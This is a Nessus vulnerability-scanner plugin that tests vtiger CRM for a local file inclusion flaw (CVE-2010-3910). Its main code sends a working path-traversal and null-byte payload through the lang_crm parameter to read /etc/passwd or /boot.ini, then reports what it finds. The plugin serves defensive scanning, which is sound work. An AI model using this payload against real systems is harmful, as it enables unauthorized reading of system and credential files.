#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(50829);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2016/11/03 14:16:36 $");

  script_cve_id("CVE-2010-3910");
  script_bugtraq_id(44901);
  script_osvdb_id(69383);

  script_name(english:"vtiger CRM phprint.php lang_crm Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is susceptible to a local
file inclusion attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of vtiger CRM installed on the remote host does not
sanitize user input to the 'lang_crm' parameter of the 'phprint.php'
script before using it to include PHP code.

An unauthenticated, remote attacker may be able to leverage this issue
to view arbitrary files or possibly execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id.

Note that the install is also likely to be affected by several other
vulnerabilities, although Nessus has not checked for them."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2010/Nov/166");
  script_set_attribute(attribute:"see_also", value:"http://wiki.vtiger.com/index.php/Vtiger521:Release_Notes");
  script_set_attribute(attribute:"solution", value:"Upgrade to vtiger CRM version 5.21 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"vtiger CRM 5.2.0 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/11/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE, embedded:FALSE);


# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');
files = make_list(files, "vtigerservice.php");


file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";
file_pats['vtigerservice.php'] = '<h1>vtigerCRM Soap Services';


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/vtiger", "/tigercrm", "/crm", cgi_dirs()));
else dirs = make_list(cgi_dirs());

magic1 = SCRIPT_NAME;
magic2 = unixtime();

contents = "";
found_file = "";
installs = 0;
vuln_reqs = make_array();

foreach dir (dirs)
{
  # Loop through files to look for.
  foreach file (files)
  {
    # Once we find a file that works, stick with it for any subsequent tests.
    if (found_file && file != found_file) continue;

    # Try to exploit the issue.
    if (file[0] == '/')
      exploit = mult_str(str:"../", nb:12) + file + '%00';
    else
      exploit = mult_str(str:"../", nb:2) + file + '%00';

    url = dir + '/phprint.php?' +
      'module=' + magic1 + '&' +
      'action=' + magic2 + '&' +
      'lang_crm=' + exploit;

    res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

    if ('module='+magic1+'&action='+magic2+'&record="><< Back' >< res[2])
    {
      installs++;
    }
    # otherwise continue unless we're being paranoid.
    else if (report_paranoia < 2)
    {
      continue;
    }

    # There's a problem if we see the expected contents.
    body = res[2];
    file_pat = file_pats[file];

    if (egrep(pattern:file_pat, string:body))
    {
      vuln_reqs[url] = build_url(port:port, qs:url);

      if (!contents && egrep(pattern:file_pat, string:body))
      {
        found_file = file;

        contents = body;
        if ("<html>" >< contents) contents = contents - strstr(contents, "<html>");

        break;
      }
    }
  }
  if (max_index(keys(vuln_reqs)) && !thorough_tests) break;
}
if (!installs) exit(0, "The web server listening on port "+port+" does not appear to host vtiger CRM.");
if (max_index(keys(vuln_reqs)) == 0) exit(0, "No vulnerable installs of vtiger CRM were found on the web server on port "+port+".");


# Report findings.
if (report_verbosity > 0)
{
  line_limit = 10;
  trailer = '';

  if ('vtigerservice.php' >< found_file)
  {
    header =
      'Nessus verified the issue by trying to include the application\'s own\n' +
      '\'' + found_file + '\' script and verifying its output in the response\n' +
      'stream using the following URL';

    if (report_verbosity > 1)
    {
      trailer =
        'Here is its output (limited to ' + line_limit + ' lines) :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        contents + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30);
    }
  }
  else
  {
    if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);

    header =
      'Nessus was able to exploit the issue to retrieve the contents of\n' +
      "'" + found_file + "' on the remote host using the following URL";

    if (report_verbosity > 1)
    {
      trailer =
        'Here are its contents (limited to ' + line_limit + ' lines) :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        beginning_of_response(resp:contents, max_lines:line_limit) +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30);
    }
  }

  report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
  security_warning(port:port, extra:report);
}
else security_warning(port);
